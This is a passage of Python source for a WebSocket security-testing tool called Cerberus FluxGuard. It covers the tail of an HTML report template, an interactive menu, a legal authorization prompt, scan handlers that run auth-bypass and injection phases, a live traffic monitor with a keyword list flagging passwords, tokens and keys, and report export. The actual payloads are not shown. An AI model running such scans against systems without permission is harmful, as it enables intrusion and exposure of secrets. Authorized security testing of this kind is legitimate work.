            <div class="meta">
                <p>📅 {datetime.now().strftime('%B %d, %Y at %H:%M:%S')} | 🔑 Session: {report.session_id}</p>
                <p>👤 Author: {AUTHOR} | 🏢 Organization: {ORG}</p>
            </div>
        </div>
        
        <!-- Executive Summary -->
        <div class="summary">
            <h2>📊 Executive Summary</h2>
            <div class="score-box">
                <div class="grade">{report.statistics.get('security_grade', 'N/A')}</div>
                <div class="label">Security Grade ({report.statistics.get('security_score', 'N/A')})</div>
            </div>
            
            <p style="margin:15px 0;"><strong>🎯 Target:</strong> <code>{report.target}</code></p>
            <p style="margin:15px 0;"><strong>⏱️ Scan Duration:</strong> {report.statistics.get('scan_duration', 'N/A')}</p>
            <p style="margin:15px 0;"><strong>⚠️ Risk Score:</strong> {report.statistics.get('total_risk_score', 0)}/{report.statistics.get('max_risk_score', 0)}</p>
            
            <div class="stats">
                <div class="stat"><div class="num critical">{report.statistics.get('critical', 0)}</div><div class="lbl">🔴 Critical</div></div>
                <div class="stat"><div class="num high">{report.statistics.get('high', 0)}</div><div class="lbl">🟠 High</div></div>
                <div class="stat"><div class="num medium">{report.statistics.get('medium', 0)}</div><div class="lbl">🟡 Medium</div></div>
                <div class="stat"><div class="num low">{report.statistics.get('low', 0)}</div><div class="lbl">🟢 Low</div></div>
                <div class="stat"><div class="num info">{report.statistics.get('info', 0)}</div><div class="lbl">🔵 Info</div></div>
                <div class="stat"><div class="num" style="color:#58a6ff;">{report.statistics.get('total_vulnerabilities', 0)}</div><div class="lbl">📋 Total</div></div>
                <div class="stat"><div class="num" style="color:#58a6ff;">{report.statistics.get('endpoints_discovered', 0)}</div><div class="lbl">📡 Endpoints</div></div>
            </div>
        </div>
        
        <!-- Vulnerabilities -->
        <h2 style="color:#58a6ff;margin-bottom:15px;font-size:20px;">🔍 Detailed Findings</h2>
        {vulns_html if vulns_html else '<div style="text-align:center;padding:40px;background:#0d1117;border:1px solid #30363d;border-radius:12px;"><p style="color:#00ff00;font-size:18px;">✅ No vulnerabilities detected!</p><p style="color:#8b949e;">The target appears to be secure against tested attack vectors.</p></div>'}
        
        <!-- Endpoints -->
        {f'<div class="endpoints"><h2>📡 Discovered Endpoints ({len(report.endpoints_discovered)})</h2><ul>{"".join(f"<li>{ep}</li>" for ep in report.endpoints_discovered)}</ul></div>' if report.endpoints_discovered else ''}
        
        <!-- Footer -->
        <div class="footer">
            <p><span class="sword">{BANNER_CHAR}</span> Cerberus FluxGuard v{VERSION} | {ORG} | {AUTHOR} <span class="sword">{BANNER_CHAR[::-1]}</span></p>
            <p>⚠️ This report contains sensitive security information. Handle with appropriate confidentiality.</p>
            <p style="margin-top:10px;">Generated on {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>"""

# ============================================================================
# MAIN APPLICATION
# ============================================================================
class CerberusFluxGuard:
    """Main application with maximum features"""
    
    def __init__(self):
        self.engine = FluxGuardEngine()
        self.scan_history: List[ScanReport] = []
        self.reporter = ReportGenerator()
        self.running = True
        self.logger = Logger()
    
    def run(self):
        """Run the application"""
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_banner()
        self._show_legal()
        
        if not self._accept_terms():
            sys.exit(0)
        
        print(f"\n{C.SUCCESS}✅ Cerberus FluxGuard v{VERSION} initialized successfully!{C.RESET}")
        print(f"{C.DIM}   Type 'help' for available commands | 'exit' to quit{C.RESET}")
        
        while self.running:
            try:
                self._show_prompt()
                cmd = input().strip().lower()
                
                if cmd in ['1', 'scan', 'full']:
                    self._handle_scan()
                elif cmd in ['2', 'quick']:
                    self._handle_quick()
                elif cmd in ['3', 'monitor', 'live']:
                    self._handle_monitor()
                elif cmd in ['4', 'payloads', 'arsenal']:
                    self._handle_payloads()
                elif cmd in ['5', 'history', 'past']:
                    self._handle_history()
                elif cmd in ['6', 'export', 'report']:
                    self._handle_export()
                elif cmd in ['7', 'help', '?']:
                    self._handle_help()
                elif cmd in ['0', 'exit', 'quit', 'q']:
                    self._handle_exit()
                    break
                elif cmd.startswith('scan '):
                    url = cmd[5:].strip()
                    self._start_scan(url)
                elif cmd.startswith('quick '):
                    url = cmd[6:].strip()
                    self._start_quick(url)
                elif cmd.startswith('monitor '):
                    url = cmd[8:].strip()
                    self._start_monitor(url)
                else:
                    print(f"{C.WARNING}[!] Unknown command: '{cmd}'{C.RESET}")
                    print(f"{C.DIM}   Type 'help' for available commands{C.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{C.INFO}[*] Press Ctrl+C again or type 'exit' to quit{C.RESET}")
                try:
                    time.sleep(0.5)
                except KeyboardInterrupt:
                    self._handle_exit()
                    break
            except Exception as e:
                print(f"{C.ERROR}[!] Error: {e}{C.RESET}")
                self.logger.error(f"Main loop error: {e}")
    
    def _show_banner(self):
        """Display ASCII art banner"""
        if PYFIGLET:
            try:
                banner = pyfiglet.figlet_format("FLUXGUARD", font="slant")
                print(f"{C.SWORD}{banner}{C.RESET}")
            except:
                pass
        
        print(f"""{C.SWORD}
{BANNER_CHAR} CERBERUS FLUXGUARD v{VERSION} MAXIMUM EDITION {BANNER_CHAR[::-1]}
{BANNER_CHAR}{'='*60}{BANNER_CHAR[::-1]}
{BANNER_CHAR}  ⚔️  WebSocket Security Intelligence Platform  ⚔️        {BANNER_CHAR[::-1]}
{BANNER_CHAR}  👤 Author: {AUTHOR}                          {BANNER_CHAR[::-1]}
{BANNER_CHAR}  🏢 Powered by {ORG}                               {BANNER_CHAR[::-1]}
{BANNER_CHAR}{'='*60}{BANNER_CHAR[::-1]}
{BANNER_CHAR} ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠️ {BANNER_CHAR[::-1]}
{C.RESET}""")
    
    def _show_legal(self):
        """Display legal warning"""
        print(f"""
{C.WARNING}╔══════════════════════════════════════════════════════════════════╗
║                  ⚖️  LEGAL WARNING - READ CAREFULLY  ⚖️                  ║
║                                                                      ║
║  This tool is designed for AUTHORIZED security testing ONLY.         ║
║                                                                      ║
║  BEFORE USING THIS TOOL, YOU MUST HAVE:                              ║
║    • Explicit written permission from the system owner               ║
║    • Legal authorization to perform security testing                 ║
║    • Understanding of responsible disclosure practices               ║
║                                                                      ║
║  UNAUTHORIZED USE MAY VIOLATE:                                       ║
║    • Computer Fraud and Abuse Act (CFAA) - United States             ║
║    • General Data Protection Regulation (GDPR) - Europe              ║
║    • Computer Misuse Act - United Kingdom                            ║
║    • Various international cybercrime and computer laws              ║
║                                                                      ║
║  THE DEVELOPER ASSUMES NO LIABILITY FOR:                             ║
║    • Unauthorized or illegal use of this software                    ║
║    • Damage caused by misuse or improper testing                     ║
║    • Legal consequences resulting from unlawful activities           ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝{C.RESET}""")
    
    def _accept_terms(self) -> bool:
        """Get user acceptance"""
        print(f"\n{C.BOLD}To continue, type 'YES' to confirm you have proper authorization:{C.RESET}")
        response = input(f"{C.WARNING}[?] > {C.RESET}").strip()
        if response.upper() != 'YES':
            print(f"\n{C.ERROR}[!] You must type 'YES' exactly to continue. Exiting...{C.RESET}")
            return False
        print(f"\n{C.SUCCESS}[+] Terms accepted. Loading FluxGuard...{C.RESET}")
        time.sleep(0.3)
        return True
    
    def _show_prompt(self):
        """Show command prompt"""
        print(f"\n{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.SWORD}[{C.RESET} {C.BOLD}FLUXGUARD v{VERSION}{C.RESET} {C.SWORD}]{C.RESET}")
        print(f" {C.BOLD}1.{C.RESET}Full Scan {C.BOLD}2.{C.RESET}Quick {C.BOLD}3.{C.RESET}Monitor {C.BOLD}4.{C.RESET}Payloads {C.BOLD}5.{C.RESET}History {C.BOLD}6.{C.RESET}Export {C.BOLD}7.{C.RESET}Help {C.BOLD}0.{C.RESET}Exit")
        print(f"{C.DIM}{'─'*55}{C.RESET}")
        print(f"{C.BOLD}▶ {C.RESET}", end="")
    
    def _handle_scan(self):
        """Handle full scan"""
        print(f"\n{C.SWORD}{BANNER_CHAR} FULL COMPREHENSIVE SCAN {BANNER_CHAR[::-1]}{C.RESET}")
        print(f"{C.DIM}7-phase security assessment | Tests 200+ payloads | 2-3 minutes{C.RESET}")
        url = input(f"{C.INFO}🎯 Enter target URL (ws:// or wss://): {C.RESET}").strip()
        self._start_scan(url)
    
    def _handle_quick(self):
        """Handle quick scan"""
        print(f"\n{C.SWORD}{BANNER_CHAR} QUICK SCAN {BANNER_CHAR[::-1]}{C.RESET}")
        print(f"{C.DIM}Handshake + Auth only | 15-30 seconds{C.RESET}")
        url = input(f"{C.INFO}🎯 Enter target URL (ws:// or wss://): {C.RESET}").strip()
        self._start_quick(url)
    
    def _handle_monitor(self):
        """Handle live monitoring"""
        print(f"\n{C.SWORD}{BANNER_CHAR} LIVE MONITOR {BANNER_CHAR[::-1]}{C.RESET}")
        print(f"{C.DIM}Real-time WebSocket traffic viewer | Type 'exit' to stop{C.RESET}")
        url = input(f"{C.INFO}🎯 Enter target URL (ws:// or wss://): {C.RESET}").strip()
        self._start_monitor(url)
    
    def _handle_payloads(self):
        """Show payload database"""
        print(f"\n{C.SWORD}{BANNER_CHAR} PAYLOAD ARSENAL {BANNER_CHAR[::-1]}{C.RESET}")
        for cat, payloads in PayloadDB.get_all_categories().items():
            if isinstance(payloads, dict):
                total = sum(len(v) for v in payloads.values())
            else:
                total = len(payloads)
            print(f"\n{C.BOLD}📦 {cat} ({total} payloads){C.RESET}")
            print(f"{C.DIM}{'─'*50}{C.RESET}")
            
            if isinstance(payloads, dict):
                for subcat, subpayloads in payloads.items():
                    print(f"  {C.DIM}[{subcat}] {len(subpayloads)} payloads{C.RESET}")
                    for i, p in enumerate(subpayloads[:2], 1):
                        print(f"    {i}. {str(p)[:60]}")
            else:
                for i, p in enumerate(payloads[:5], 1):
                    print(f"  {i}. {str(p)[:65]}")
    
    def _handle_history(self):
        """Show scan history"""
        if not self.scan_history:
            print(f"\n{C.WARNING}[-] No scans in history. Run a scan first!{C.RESET}")
            return
        
        print(f"\n{C.SWORD}{BANNER_CHAR} SCAN HISTORY ({len(self.scan_history)} scans) {BANNER_CHAR[::-1]}{C.RESET}")
        for i, r in enumerate(self.scan_history, 1):
            v = r.statistics.get('total_vulnerabilities', 0)
            c = C.CRITICAL if v > 0 else C.SUCCESS
            d = r.statistics.get('scan_duration', 'N/A')
            print(f"  {C.BOLD}{i}.{C.RESET} {r.target}")
            print(f"     {c}{v} findings{C.RESET} │ ⏱️ {d} │ 🔑 {r.session_id}")
    
    def _handle_export(self):
        """Export reports"""
        if not self.scan_history:
            print(f"\n{C.WARNING}[-] No scans to export. Run a scan first!{C.RESET}")
            return
        
        self._handle_history()
        
        try:
            idx = int(input(f"\n{C.INFO}Select scan number to export: {C.RESET}")) - 1
            if 0 <= idx < len(self.scan_history):
                fmt = input(f"{C.INFO}Export format (json/html/both): {C.RESET}").strip().lower()
                if fmt in ['json', 'both']:
                    self._save_report(self.scan_history[idx], 'json')
                if fmt in ['html', 'both']:
                    self._save_report(self.scan_history[idx], 'html')
                if fmt not in ['json', 'html', 'both']:
                    print(f"{C.ERROR}[!] Invalid format. Use 'json', 'html', or 'both'{C.RESET}")
            else:
                print(f"{C.ERROR}[!] Invalid scan number{C.RESET}")
        except ValueError:
            print(f"{C.ERROR}[!] Please enter a valid number{C.RESET}")
    
    def _handle_help(self):
        """Show help"""
        print(f"""
{C.SWORD}{BANNER_CHAR} HELP & DOCUMENTATION {BANNER_CHAR[::-1]}{C.RESET}

{C.BOLD}📋 AVAILABLE COMMANDS:{C.RESET}
  {C.GREEN}1 / scan / full{C.RESET}      7-phase comprehensive security assessment
  {C.GREEN}2 / quick{C.RESET}            Fast scan - handshake + auth only
  {C.GREEN}3 / monitor / live{C.RESET}   Real-time WebSocket traffic monitoring
  {C.GREEN}4 / payloads / arsenal{C.RESET} View complete payload database
  {C.GREEN}5 / history / past{C.RESET}    View previous scan results
  {C.GREEN}6 / export / report{C.RESET}   Export reports in JSON/HTML format
  {C.GREEN}7 / help / ?{C.RESET}          Show this help menu
  {C.GREEN}0 / exit / quit / q{C.RESET}   Exit Cerberus FluxGuard

{C.BOLD}🚀 QUICK COMMANDS:{C.RESET}
  {C.DIM}scan ws://localhost:8080{C.RESET}     Run full scan directly
  {C.DIM}quick ws://localhost:8080{C.RESET}    Run quick scan directly
  {C.DIM}monitor ws://localhost:8080{C.RESET}  Start monitoring directly

{C.BOLD}🔍 7 SCAN PHASES:{C.RESET}
  1. 🔍 Handshake & Protocol Analysis
  2. 🔑 Authentication Bypass (50+ payloads)
  3. 💉 Injection Fuzzing (XSS, SSTI, SQL, NoSQL, CMD, Path)
  4. 📡 Channel/Endpoint Discovery
  5. ⚡ Rate Limiting & DoS Testing
  6. 🔐 Sensitive Data Exposure
  7. 🔌 WebSocket-Specific Attacks

{C.BOLD}📊 PAYLOAD CATEGORIES:{C.RESET}
  • Auth Bypass (50+)  • XSS (30)  • SSTI (25)  • SQL Injection (20)
  • NoSQL Injection (15)  • Command Injection (20)  • Path Traversal (15)
  • XXE (3)  • Deserialization (5)  • DoS (6)

{C.BOLD}📝 EXAMPLE SETUP:{C.RESET}
  Terminal 1: {C.DIM}python3 -m websockets ws://localhost:8080{C.RESET}
  Terminal 2: {C.DIM}python3 cerberus_fluxguard.py{C.RESET}
  Then: {C.DIM}> 1 > ws://localhost:8080{C.RESET}

{C.BOLD}⚠️  REMEMBER:{C.RESET} Only test systems you OWN or have WRITTEN PERMISSION to test!
{C.DIM}{'─'*55}{C.RESET}""")
    
    def _handle_exit(self):
        """Exit application"""
        self.running = False
        print(f"""
{C.SWORD}{BANNER_CHAR} SHUTTING DOWN {BANNER_CHAR[::-1]}{C.RESET}

    ⚔️  "Strike swift, strike true, stay legal." ⚔️
    
    {C.BOLD}Cerberus FluxGuard v{VERSION}{C.RESET}
    👤 Author: {AUTHOR}
    🏢 Powered by {ORG}
    
    {C.GREEN}Thank you for using Cerberus FluxGuard!{C.RESET}
    {C.DIM}Remember: With great power comes great responsibility.{C.RESET}
""")
    
    def _start_scan(self, url: str):
        """Start full scan"""
        if not url or not url.startswith(('ws://', 'wss://')):
            print(f"{C.ERROR}[!] URL must start with ws:// or wss://{C.RESET}")
            return
        
        print(f"\n{C.BOLD}🚀 Starting 7-phase comprehensive scan...{C.RESET}")
        print(f"{C.DIM}   Each phase has 60-second timeout protection{C.RESET}")
        print(f"{C.DIM}   Testing 200+ payloads across multiple attack vectors{C.RESET}")
        
        try:
            report = self.engine.full_scan(url)
            self.scan_history.append(report)
            
            # Offer export
            print(f"\n{C.BOLD}💾 Export Report:{C.RESET}")
            exp = input(f"{C.INFO}Export format? (json/html/both/skip): {C.RESET}").strip().lower()
            if exp in ['json', 'both']:
                self._save_report(report, 'json')
            if exp in ['html', 'both']:
                self._save_report(report, 'html')
            if exp == 'skip':
                print(f"{C.DIM}[*] Report not exported{C.RESET}")
                
        except Exception as e:
            print(f"{C.ERROR}[!] Scan failed: {e}{C.RESET}")
            self.logger.error(f"Scan failed for {url}: {e}")
    
    def _start_quick(self, url: str):
        """Start quick scan"""
        if not url or not url.startswith(('ws://', 'wss://')):
            print(f"{C.ERROR}[!] URL must start with ws:// or wss://{C.RESET}")
            return
        
        print(f"\n{C.BOLD}⚡ Starting quick scan...{C.RESET}")
        
        report = ScanReport(target=url)
        
        # Phase 1: Handshake
        print(f"\n{C.SWORD}[{C.RESET} Phase 1: Handshake Analysis {C.SWORD}]{C.RESET}")
        hs = self.engine.analyze_handshake(url)
        report.handshake_analysis = hs
        
        for f in hs.get("findings", []):
            report.vulnerabilities.append(Vulnerability(
                name=f["finding"],
                description=f.get("detail", ""),
                severity=f["severity"],
                endpoint=url,
                remediation=f.get("remediation", ""),
                cwe=f.get("cwe", ""),
                owasp=f.get("owasp", ""),
                phase=ScanPhase.HANDSHAKE
            ))
            print(f"  {f['severity'].value} │ {f['finding'][:60]}")
        
        if not hs.get("findings"):
            print(f"  {C.SUCCESS}✅ No issues detected{C.RESET}")
        
        print(f"  {C.INFO}🔒 Score: {hs.get('security_score', 'N/A')} ({hs.get('grade', 'N/A')}){C.RESET}")
        
        # Phase 2: Auth
        print(f"\n{C.SWORD}[{C.RESET} Phase 2: Authentication Bypass {C.SWORD}]{C.RESET}")
        auth = self.engine.test_auth_bypass(url)
        report.vulnerabilities.extend(auth)
        
        if auth:
            for v in auth:
                print(f"  {C.CRITICAL}🔓 {v.name}{C.RESET}")
        else:
            print(f"  {C.SUCCESS}✅ Authentication secure{C.RESET}")
        
        # Finalize
        report.end_time = datetime.now()
        report.scan_duration = (report.end_time - report.start_time).total_seconds()
        
        sev = defaultdict(int)
        for v in report.vulnerabilities:
            sev[v.severity.name] += 1
        
        report.statistics = {
            "scan_duration": f"{report.scan_duration:.1f}s",
            "total_vulnerabilities": len(report.vulnerabilities),
            "critical": sev.get("CRITICAL", 0),
            "high": sev.get("HIGH", 0),
            "medium": sev.get("MEDIUM", 0),
            "low": sev.get("LOW", 0),
            "info": sev.get("INFO", 0),
            "endpoints_discovered": 0,
            "security_score": hs.get("security_score", "N/A"),
            "security_grade": hs.get("grade", "N/A"),
        }
        
        self.scan_history.append(report)
        
        print(f"\n{C.SWORD}✅ Quick scan complete in {report.scan_duration:.1f}s!{C.RESET}")
        print(f"   Found: {len(report.vulnerabilities)} potential issues")
    
    def _start_monitor(self, url: str):
        """Start live monitoring"""
        if not url or not url.startswith(('ws://', 'wss://')):
            print(f"{C.ERROR}[!] URL must start with ws:// or wss://{C.RESET}")
            return
        
        print(f"\n{C.INFO}[*] Connecting to {url}...{C.RESET}")
        
        ws = self.engine._ws_connect(url, 10)
        if not ws:
            print(f"{C.ERROR}[!] Failed to connect. Check URL and ensure server is running.{C.RESET}")
            return
        
        ws.settimeout(0.5)
        print(f"{C.SUCCESS}[+] Connected successfully!{C.RESET}")
        print(f"{C.WARNING}[*] Type 'exit' and press Enter to stop monitoring{C.RESET}")
        print(f"{C.WARNING}[*] Or press Ctrl+C twice{C.RESET}")
        print(f"{C.DIM}{'─'*60}{C.RESET}\n")
        
        active = True
        message_count = 0
        alert_count = 0
        
        def exit_checker():
            nonlocal active
            while active:
                try:
                    cmd = input()
                    if cmd.strip().lower() in ['exit', 'quit', 'stop', 'q']:
                        print(f"\n{C.INFO}[*] Stopping monitor...{C.RESET}")
                        active = False
                        break
                except (EOFError, KeyboardInterrupt):
                    active = False
                    break
                except:
                    pass
        
        exit_thread = threading.Thread(target=exit_checker, daemon=True)
        exit_thread.start()
        
        while active:
            try:
                message = ws.recv()
                message_count += 1
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                try:
                    data = json.loads(message)
                    msg_str = json.dumps(data, indent=None)[:500]
                except:
                    msg_str = str(message)[:500]
                
                # Check for sensitive data
                sensitive_keywords = [
                    'password', 'passwd', 'secret', 'token', 'key',
                    'credit_card', 'ssn', 'private_key', 'api_key'
                ]
                
                found_sensitive = [kw for kw in sensitive_keywords if kw in msg_str.lower()]
                
                if found_sensitive:
                    print(f"{C.CRITICAL}[{timestamp}] 🚨 SENSITIVE DATA: {', '.join(found_sensitive)}{C.RESET}")
                    print(f"{C.CRITICAL}  {msg_str}{C.RESET}")
                    alert_count += 1
                elif '"error"' in msg_str.lower() or '"fail"' in msg_str.lower():
                    print(f"{C.WARNING}[{timestamp}] {msg_str}{C.RESET}")
                else:
                    print(f"{C.DIM}[{timestamp}]{C.RESET} {msg_str}")
                
                if message_count % 25 == 0 and message_count > 0:
                    print(f"\n{C.INFO}[*] Received: {message_count} messages | Alerts: {alert_count}{C.RESET}\n")
                    
            except websocket.WebSocketTimeoutException:
                if not active:
                    break
                continue
                
            except websocket.WebSocketConnectionClosedException:
                print(f"\n{C.WARNING}[!] Connection closed by server{C.RESET}")
                if active:
                    print(f"{C.INFO}[*] Attempting reconnect...{C.RESET}")
                    time.sleep(2)
                    try:
                        ws = self.engine._ws_connect(url, 10)
                        if ws:
                            ws.settimeout(0.5)
                            print(f"{C.SUCCESS}[+] Reconnected!{C.RESET}")
                            continue
                    except:
                        pass
                break
                
            except Exception as e:
                if not active:
                    break
                print(f"{C.ERROR}[!] Error: {str(e)[:100]}{C.RESET}")
                continue
        
        self.engine._safe_close(ws)
        print(f"\n{C.SWORD}[]++++||=======> MONITOR ENDED <=======||++++[]{C.RESET}")
        print(f"  📨 Messages received: {message_count}")
        print(f"  🚨 Alerts triggered: {alert_count}")
        print(f"  ⏰ Ended: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    
    def _save_report(self, report: ScanReport, fmt: str):
        """Save report to file"""
        ext = 'json' if fmt == 'json' else 'html'
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"fluxguard_report_{report.session_id}_{timestamp}.{ext}"
        
        try:
            content = self.reporter.generate_json(report) if fmt == 'json' else self.reporter.generate_html(report)
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"{C.SUCCESS}[+] Report saved: {filename}{C.RESET}")
            self.logger.info(f"Report saved: {filename}")
        except Exception as e:
            print(f"{C.ERROR}[!] Failed to save report: {e}{C.RESET}")
            self.logger.error(f"Report save failed: {e}")

# ============================================================================
# ENTRY POINT
# ============================================================================
if __name__ == "__main__":
    # Handle graceful shutdown
    def signal_handler(sig, frame):
        print(f"\n\n{C.SWORD}{BANNER_CHAR} TERMINATED {BANNER_CHAR[::-1]}{C.RESET}")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        app = CerberusFluxGuard()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{C.SWORD}{BANNER_CHAR} TERMINATED {BANNER_CHAR[::-1]}{C.RESET}")
    except Exception as e:
        print(f"\n{C.ERROR}[!] Fatal error: {e}{C.RESET}")
        # Log the error
        try:
            with open('fluxguard_crash.log', 'w') as f:
                f.write(f"Fatal error at {datetime.now()}:\n{str(e)}\n")
                import traceback
                traceback.print_exc(file=f)
        except:
            pass
        sys.exit(1)
